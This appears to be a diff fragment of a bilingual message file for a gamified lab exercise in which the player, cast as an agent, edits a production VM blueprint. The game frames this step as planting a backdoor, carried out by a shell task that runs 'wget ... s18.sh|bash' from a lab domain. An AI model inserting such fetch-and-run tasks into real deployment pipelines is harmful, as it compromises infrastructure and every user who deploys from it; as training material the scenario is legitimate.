+          "Look at the blueprint #>C:white#bp-blankvm-prd#>V:Vlanid##>D# and edit it. Please add a task named #>C:white#foo#>D# in the #>C:white#Create#>D# action of the service #>C:white#NewVM#>D# after the existing #>C:white#Add DNS Entry#>D# task.\n",
+          "In the #>C:white#Execute#>D# task, with #>C:white#Shell#>D# type, enter this:\n",
+          "#>N##>C:white##>S#!/bin/bash#>D#\n\n",
+          "#>N##>C:white#wget https://dl.ntnxlab.com/ai0612/s18.sh|bash#>D#\n",
+          "Save all and send me a #>C:white#Ok#>D# message here when it's done: #>I:#"
         ],
         "fr": [
-          "\n#>A:deployBlueprint#On arrive à notre dernière tâche. #>P:4#. Nous allons modifier l'un de leurs blueprint, pour ajouter une backdoor dans la VM qu'ils vont déployer. Ce blueprint est utilisé par leurs utilisateurs finaux pour déployer une toute nouvelle VM dans leur environnement (IPAM, CMDB, DNS, règles de pare-feu, client de sauvegarde, etc).#>P:3#\nRegardez le BP bp-blankvm-prd#>V:Vlanid# et éditez-le. Ajoutez une tâche nommée 'foo' dans l'action 'Create' du service 'NewVM' après la tâche 'Add DNS Entry' existante. Dans la tâche 'Execute', de type 'Shell', entrez ceci :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSauvegardez tout et entrez 'Ok' ici lorsque vous avez terminé. #>I:#"
+          "#>A:deployBlueprint#On arrive à notre dernière tâche. #>P:2#Nous allons modifier l'un de leurs blueprint, pour ajouter une backdoor dans la VM qu'ils vont déployer.\n",
+          "Ce blueprint est utilisé par leurs utilisateurs finaux pour déployer une nouvelle VM dans leur environnement (IPAM, CMDB, DNS, Firewall, Sauvegarde, etc).#>P:3#\n\n",
+          "Regardez le blueprint #>C:white#bp-blankvm-prd#>V:Vlanid##>D# et éditez-le. Ajoutez une tâche nommée #>C:white#foo#>D# dans l'action #>C:white#Create#>D# du service #>C:white#NewVM#>D# après la tâche #>C:white#Add DNS Entry#>D# existante.\n",
+          "Dans la tâche #>C:white#Execute#>D#, de type #>C:white#Shell#>D#, entrez ceci :\n",
+          "#>N##>C:white##>S#!/bin/bash#>D#\n\n",
+          "#>N##>C:white#wget https://dl.ntnxlab.com/ai0612/s18.sh|bash#>D#\n",
+          "Sauvegardez tout et envoyez-moi un message #>C:white#Ok#>D# ici quand c'est fait : #>I:#"
         ]
       },
       "WaitForInputValue": "Ok",
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 54,
@@ -1158,10 +1204,16 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "Thank you agent #>V:Username#! It was so great to have you working on this mission and your help was decisive and valuable for your country. Close your session. I wait for you to the basecamp, I owe you a beer or two! Do not forget to bring the screenshots with you.\n"
+          "#>C:green#And there you go, mission accomplished!#>D# Thank you agent #>C:white##>V:Username##>D#...\n\n",
+          "It was so great to have you working on this mission and your help was decisive and valuable for your country. Now, you can close your session.\n",
+          "Go back to the basecamp and have a beer or two! But do not forget to bring the screenshots with you.\n\n",
+          "Looking forward to work with you on a next mission! May the force be with you ...\n#>P:10#"
         ],
         "fr": [
-          "Merci agent #>V:Username#! C'était un plaisir de vous avoir sur cette mission et votre aide a été précieuse pour votre pays. Fermez votre session. Je vous attends au camp de base, je vous dois une bière ou deux ! N'oubliez pas d'apporter les screenshots avec vous.\n"
+          "#>C:green#Et voilà, mission accomplie !#>D# Merci agent #>C:white##>V:Username##>D# ...\n\n",
+          "C'était un plaisir de vous avoir sur cette mission et votre aide a été précieuse pour votre pays. Maintenant, vous pouvez fermer votre session.\n",
+          "Revenez au camp de base et profitez d'une bière ou deux ! Mais n'oubliez pas d'apporter les screenshots avec vous.\n\n",
+          "Au plaisir de retravailler avec vous sur une prochaine mission ! Que la force soit avec vous ...\n#>P:10#"
         ]
       },
       "DefaultColor": "magenta"
@@ -1175,13 +1227,13 @@
           "#>B#\n",
           "All traces have been deleted!#>P:3#\n",
           "Closing connection... #>P:3#\n\n",
-          "Connection closed!"
+          "Connection closed!\n"
         ],
         "fr": [
           "#>B#\n",
           "Suppression des traces effectuées !#>P:3#\n",
           "Fermeture de la connexion en cours ... #>P:3#\n\n",
-          "Connexion fermée !"
+          "Connexion fermée !\n"
         ]
       },
       "DefaultColor": "white"
